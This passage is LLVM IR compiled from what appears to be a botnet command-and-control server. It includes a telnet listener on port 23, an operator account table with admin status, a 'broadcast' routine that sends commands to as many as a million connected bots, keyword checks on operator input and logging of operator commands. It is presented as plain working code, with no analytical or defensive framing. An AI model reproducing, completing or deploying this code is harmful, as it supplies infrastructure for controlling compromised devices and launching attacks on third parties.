  %896 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %897 = call i32 (i8*, i8*, ...) @sprintf(i8* %896, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.110, i64 0, i64 0)) #8
  %898 = load i32, i32* %6, align 4
  %899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %900 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %901 = call i64 @strlen(i8* %900) #9
  %902 = call i64 @send(i32 %898, i8* %899, i64 %901, i32 16384)
  %903 = icmp eq i64 %902, -1
  br i1 %903, label %904, label %905

904:                                              ; preds = %895
  store i8* null, i8** %2, align 8
  br label %1133

905:                                              ; preds = %895
  %906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %907 = call i32 (i8*, i8*, ...) @sprintf(i8* %906, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.111, i64 0, i64 0)) #8
  %908 = load i32, i32* %6, align 4
  %909 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %910 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %911 = call i64 @strlen(i8* %910) #9
  %912 = call i64 @send(i32 %908, i8* %909, i64 %911, i32 16384)
  %913 = icmp eq i64 %912, -1
  br i1 %913, label %914, label %915

914:                                              ; preds = %905
  store i8* null, i8** %2, align 8
  br label %1133

915:                                              ; preds = %905
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %917 = call i32 (i8*, i8*, ...) @sprintf(i8* %916, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.112, i64 0, i64 0)) #8
  %918 = load i32, i32* %6, align 4
  %919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %920 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %921 = call i64 @strlen(i8* %920) #9
  %922 = call i64 @send(i32 %918, i8* %919, i64 %921, i32 16384)
  %923 = icmp eq i64 %922, -1
  br i1 %923, label %924, label %925

924:                                              ; preds = %915
  store i8* null, i8** %2, align 8
  br label %1133

925:                                              ; preds = %915
  br label %937

926:                                              ; preds = %892
  %927 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %928 = call i32 (i8*, i8*, ...) @sprintf(i8* %927, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.113, i64 0, i64 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.114, i64 0, i64 0)) #8
  %929 = load i32, i32* %6, align 4
  %930 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %931 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %932 = call i64 @strlen(i8* %931) #9
  %933 = call i64 @send(i32 %929, i8* %930, i64 %932, i32 16384)
  %934 = icmp eq i64 %933, -1
  br i1 %934, label %935, label %936

935:                                              ; preds = %926
  store i8* null, i8** %2, align 8
  br label %1133

936:                                              ; preds = %926
  br label %937

937:                                              ; preds = %936, %925
  br label %985

938:                                              ; preds = %888
  %939 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %940 = call i8* @strstr(i8* %939, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i64 0, i64 0)) #9
  %941 = icmp ne i8* %940, null
  br i1 %941, label %954, label %942

942:                                              ; preds = %938
  %943 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %944 = call i8* @strstr(i8* %943, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.116, i64 0, i64 0)) #9
  %945 = icmp ne i8* %944, null
  br i1 %945, label %954, label %946

946:                                              ; preds = %942
  %947 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %948 = call i8* @strstr(i8* %947, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.117, i64 0, i64 0)) #9
  %949 = icmp ne i8* %948, null
  br i1 %949, label %954, label %950

950:                                              ; preds = %946
  %951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %952 = call i8* @strstr(i8* %951, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0)) #9
  %953 = icmp ne i8* %952, null
  br i1 %953, label %954, label %984

954:                                              ; preds = %950, %946, %942, %938
  %955 = load i32, i32* %6, align 4
  %956 = call i64 @send(i32 %955, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i64 0, i64 0), i64 14, i32 16384)
  %957 = icmp eq i64 %956, -1
  br i1 %957, label %958, label %959

958:                                              ; preds = %954
  br label %1124

959:                                              ; preds = %954
  %960 = load i32, i32* %6, align 4
  %961 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %962 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %963 = call i64 @strlen(i8* %962) #9
  %964 = call i64 @send(i32 %960, i8* %961, i64 %963, i32 16384)
  %965 = icmp eq i64 %964, -1
  br i1 %965, label %966, label %967

966:                                              ; preds = %959
  br label %1124

967:                                              ; preds = %959
  %968 = load i32, i32* %6, align 4
  %969 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %970 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %971 = call i64 @strlen(i8* %970) #9
  %972 = call i64 @send(i32 %968, i8* %969, i64 %971, i32 16384)
  %973 = icmp eq i64 %972, -1
  br i1 %973, label %974, label %975

974:                                              ; preds = %967
  br label %1124

975:                                              ; preds = %967
  %976 = load i32, i32* %6, align 4
  %977 = sext i32 %976 to i64
  %978 = inttoptr i64 %977 to i8*
  %979 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %978) #8
  %980 = load i32, i32* %6, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %981
  %983 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %982, i32 0, i32 1
  store i32 1, i32* %983, align 4
  br label %984

984:                                              ; preds = %975, %950
  br label %985

985:                                              ; preds = %984, %937
  br label %986

986:                                              ; preds = %985, %883
  br label %987

987:                                              ; preds = %986, %824
  br label %988

988:                                              ; preds = %987, %779
  br label %989

989:                                              ; preds = %988, %720
  br label %990

990:                                              ; preds = %989, %690
  br label %991

991:                                              ; preds = %990, %675
  br label %992

992:                                              ; preds = %991, %441
  %993 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @trim(i8* %993)
  %994 = getelementptr inbounds [200 x i8*], [200 x i8*]* %33, i64 0, i64 0
  %995 = bitcast i8** %994 to i8*
  %996 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %995, i64 1600, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.10, i64 0, i64 0)) #8
  %997 = load i32, i32* %6, align 4
  %998 = getelementptr inbounds [200 x i8*], [200 x i8*]* %33, i64 0, i64 0
  %999 = bitcast i8** %998 to i8*
  %1000 = getelementptr inbounds [200 x i8*], [200 x i8*]* %33, i64 0, i64 0
  %1001 = bitcast i8** %1000 to i8*
  %1002 = call i64 @strlen(i8* %1001) #9
  %1003 = call i64 @send(i32 %997, i8* %999, i64 %1002, i32 16384)
  %1004 = icmp eq i64 %1003, -1
  br i1 %1004, label %1005, label %1006

1005:                                             ; preds = %992
  br label %1124

1006:                                             ; preds = %992
  %1007 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1008 = call i64 @strlen(i8* %1007) #9
  %1009 = icmp eq i64 %1008, 0
  br i1 %1009, label %1010, label %1011

1010:                                             ; preds = %1006
  br label %358, !llvm.loop !25

1011:                                             ; preds = %1006
  %1012 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1013 = call i8* @strstr(i8* %1012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.116, i64 0, i64 0)) #9
  %1014 = icmp ne i8* %1013, null
  br i1 %1014, label %1071, label %1015

1015:                                             ; preds = %1011
  %1016 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1017 = call i8* @strstr(i8* %1016, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0)) #9
  %1018 = icmp ne i8* %1017, null
  br i1 %1018, label %1071, label %1019

1019:                                             ; preds = %1015
  %1020 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1021 = call i8* @strstr(i8* %1020, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #9
  %1022 = icmp ne i8* %1021, null
  br i1 %1022, label %1071, label %1023

1023:                                             ; preds = %1019
  %1024 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1025 = call i8* @strstr(i8* %1024, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0)) #9
  %1026 = icmp ne i8* %1025, null
  br i1 %1026, label %1071, label %1027

1027:                                             ; preds = %1023
  %1028 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1029 = call i8* @strstr(i8* %1028, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i64 0, i64 0)) #9
  %1030 = icmp ne i8* %1029, null
  br i1 %1030, label %1071, label %1031

1031:                                             ; preds = %1027
  %1032 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1033 = call i8* @strstr(i8* %1032, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0)) #9
  %1034 = icmp ne i8* %1033, null
  br i1 %1034, label %1071, label %1035

1035:                                             ; preds = %1031
  %1036 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1037 = call i8* @strstr(i8* %1036, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i64 0, i64 0)) #9
  %1038 = icmp ne i8* %1037, null
  br i1 %1038, label %1071, label %1039

1039:                                             ; preds = %1035
  %1040 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1041 = call i8* @strstr(i8* %1040, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #9
  %1042 = icmp ne i8* %1041, null
  br i1 %1042, label %1071, label %1043

1043:                                             ; preds = %1039
  %1044 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1045 = call i8* @strstr(i8* %1044, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i64 0, i64 0)) #9
  %1046 = icmp ne i8* %1045, null
  br i1 %1046, label %1071, label %1047

1047:                                             ; preds = %1043
  %1048 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1049 = call i8* @strstr(i8* %1048, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #9
  %1050 = icmp ne i8* %1049, null
  br i1 %1050, label %1071, label %1051

1051:                                             ; preds = %1047
  %1052 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1053 = call i8* @strstr(i8* %1052, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i64 0, i64 0)) #9
  %1054 = icmp ne i8* %1053, null
  br i1 %1054, label %1071, label %1055

1055:                                             ; preds = %1051
  %1056 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1057 = call i8* @strstr(i8* %1056, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i64 0, i64 0)) #9
  %1058 = icmp ne i8* %1057, null
  br i1 %1058, label %1071, label %1059

1059:                                             ; preds = %1055
  %1060 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1061 = call i8* @strstr(i8* %1060, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.119, i64 0, i64 0)) #9
  %1062 = icmp ne i8* %1061, null
  br i1 %1062, label %1071, label %1063

1063:                                             ; preds = %1059
  %1064 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1065 = call i8* @strstr(i8* %1064, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i64 0, i64 0)) #9
  %1066 = icmp ne i8* %1065, null
  br i1 %1066, label %1071, label %1067

1067:                                             ; preds = %1063
  %1068 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1069 = call i8* @strstr(i8* %1068, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0)) #9
  %1070 = icmp ne i8* %1069, null
  br i1 %1070, label %1071, label %1075

1071:                                             ; preds = %1067, %1063, %1059, %1055, %1051, %1047, %1043, %1039, %1035, %1031, %1027, %1023, %1019, %1015, %1011
  %1072 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %1073 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1074 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i64 0, i64 0), i8* %1072, i8* %1073)
  br label %1084

1075:                                             ; preds = %1067
  %1076 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %1077 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1078 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.122, i64 0, i64 0), i8* %1076, i8* %1077)
  %1079 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1080 = load i32, i32* %6, align 4
  %1081 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %1082 = load i32, i32* %6, align 4
  call void @broadcast(i8* %1079, i32 %1080, i8* %1081, i32 0, i32 1000000, i32 %1082)
  %1083 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1083, i8 0, i64 2048, i1 false)
  br label %1084

1084:                                             ; preds = %1075, %1071
  %1085 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i64 0, i64 0))
  store %struct._IO_FILE* %1085, %struct._IO_FILE** %34, align 8
  %1086 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %1087 = load i32, i32* %8, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %1088
  %1090 = getelementptr inbounds %struct.account, %struct.account* %1089, i32 0, i32 0
  %1091 = getelementptr inbounds [200 x i8], [200 x i8]* %1090, i64 0, i64 0
  %1092 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1093 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1086, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.124, i64 0, i64 0), i8* %1091, i8* %1092)
  %1094 = load %struct._IO_FILE*, %struct._IO_FILE** %34, align 8
  %1095 = call i32 @fclose(%struct._IO_FILE* %1094)
  br label %358, !llvm.loop !25

1096:                                             ; preds = %358
  %1097 = load i32, i32* @adminstatus, align 4
  %1098 = icmp eq i32 %1097, 1
  br i1 %1098, label %1099, label %1111

1099:                                             ; preds = %1096
  %1100 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1101 = load i32, i32* %6, align 4
  %1102 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %1103 = load i32, i32* %6, align 4
  call void @broadcast(i8* %1100, i32 %1101, i8* %1102, i32 4, i32 1000000, i32 %1103)
  %1104 = load i32, i32* %8, align 4
  %1105 = sext i32 %1104 to i64
  %1106 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %1105
  %1107 = getelementptr inbounds %struct.account, %struct.account* %1106, i32 0, i32 0
  %1108 = getelementptr inbounds [200 x i8], [200 x i8]* %1107, i64 0, i64 0
  %1109 = load i8*, i8** %7, align 8
  %1110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.125, i64 0, i64 0), i8* %1108, i8* %1109)
  br label %1123

1111:                                             ; preds = %1096
  %1112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %1113 = load i32, i32* %6, align 4
  %1114 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i64 0, i64 0
  %1115 = load i32, i32* %6, align 4
  call void @broadcast(i8* %1112, i32 %1113, i8* %1114, i32 2, i32 1000000, i32 %1115)
  %1116 = load i32, i32* %8, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %1117
  %1119 = getelementptr inbounds %struct.account, %struct.account* %1118, i32 0, i32 0
  %1120 = getelementptr inbounds [200 x i8], [200 x i8]* %1119, i64 0, i64 0
  %1121 = load i8*, i8** %7, align 8
  %1122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.126, i64 0, i64 0), i8* %1120, i8* %1121)
  br label %1123

1123:                                             ; preds = %1111, %1099
  br label %1124

1124:                                             ; preds = %1123, %1005, %974, %966, %958, %348, %340, %332, %167, %166, %158, %139, %134, %128, %107, %101, %96
  %1125 = load i32, i32* %6, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1126
  %1128 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1127, i32 0, i32 1
  store i32 0, i32* %1128, align 4
  %1129 = load i32, i32* %6, align 4
  %1130 = call i32 @close(i32 %1129)
  %1131 = load volatile i32, i32* @managesConnected, align 4
  %1132 = add nsw i32 %1131, -1
  store volatile i32 %1132, i32* @managesConnected, align 4
  br label %1133

1133:                                             ; preds = %1124, %935, %924, %914, %904, %882, %872, %862, %852, %842, %818, %777, %766, %719, %689, %673, %636, %624, %609, %594, %579, %564, %549, %534, %519, %504, %489, %475, %463, %440, %430, %420, %410, %400, %390, %380
  %1134 = load i8*, i8** %2, align 8
  ret i8* %1134
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #2

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.epoll_event, align 1
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.telnetListenerArgs, align 4
  %10 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %11, i32* %3, align 4
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

14:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i64 0, i64 0))
  br label %15

15:                                               ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %16, i8 0, i64 16, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = call zeroext i16 @htons(i16 zeroext 23) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #8
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %15
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.128, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %15
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #8
  store i32 16, i32* %6, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %6)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = getelementptr inbounds %struct.telnetListenerArgs, %struct.telnetListenerArgs* %9, i32 0, i32 0
  store i32 %38, i32* %39, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = getelementptr inbounds %struct.telnetListenerArgs, %struct.telnetListenerArgs* %9, i32 0, i32 1
  store i32 %42, i32* %43, align 4
  %44 = bitcast %struct.telnetListenerArgs* %9 to i8*
  %45 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %44) #8
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #8
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 3
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.130, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.131, i64 0, i64 0))
  %25 = load i8**, i8*** %6, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27) #9
  store i32 %28, i32* %9, align 4
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @create_and_bind(i8* %31)
  store volatile i32 %32, i32* @listenFD, align 4
  %33 = load volatile i32, i32* @listenFD, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

35:                                               ; preds = %23
  call void @abort() #11
  unreachable

36:                                               ; preds = %23
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = call i32 @make_socket_non_blocking(i32 %37)
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %36
  call void @abort() #11
  unreachable

42:                                               ; preds = %36
  %43 = load volatile i32, i32* @listenFD, align 4
  %44 = call i32 @listen(i32 %43, i32 4096) #8
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i64 0, i64 0))
  call void @abort() #11
  unreachable

48:                                               ; preds = %42
  %49 = call i32 @epoll_create1(i32 0) #8
  store volatile i32 %49, i32* @epollFD, align 4
  %50 = load volatile i32, i32* @epollFD, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %48
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i64 0, i64 0))
  call void @abort() #11
  unreachable

53:                                               ; preds = %48
  %54 = load volatile i32, i32* @listenFD, align 4
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %56 = bitcast %union.epoll_data* %55 to i32*
  store i32 %54, i32* %56, align 1
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %57, align 1
  %58 = load volatile i32, i32* @epollFD, align 4
  %59 = load volatile i32, i32* @listenFD, align 4
  %60 = call i32 @epoll_ctl(i32 %58, i32 1, i32 %59, %struct.epoll_event* %11) #8
  store i32 %60, i32* %8, align 4
  %61 = load i32, i32* %8, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %64

63:                                               ; preds = %53
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.20, i64 0, i64 0))
  call void @abort() #11
  unreachable

64:                                               ; preds = %53
  %65 = load i32, i32* %9, align 4
  %66 = add nsw i32 %65, 2
  %67 = zext i32 %66 to i64
  %68 = call i8* @llvm.stacksave()
  store i8* %68, i8** %12, align 8
  %69 = alloca i64, i64 %67, align 16
  store i64 %67, i64* %13, align 8
  br label %70

70:                                               ; preds = %74, %64
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %9, align 4
  %73 = icmp ne i32 %71, 0
  br i1 %73, label %74, label %80

74:                                               ; preds = %70
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, 2
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i64, i64* %69, i64 %77
  %79 = call i32 @pthread_create(i64* %78, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #8
  br label %70, !llvm.loop !26

80:                                               ; preds = %70
  %81 = getelementptr inbounds i64, i64* %69, i64 0
  %82 = load i32, i32* %10, align 4
  %83 = sext i32 %82 to i64
  %84 = inttoptr i64 %83 to i8*
  %85 = call i32 @pthread_create(i64* %81, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %84) #8
  br label %86

86:                                               ; preds = %87, %80
  br label %87

87:                                               ; preds = %86
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), i32 0, i32 1000000, i32 0)
  %88 = call i32 @sleep(i32 60)
  br label %86
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
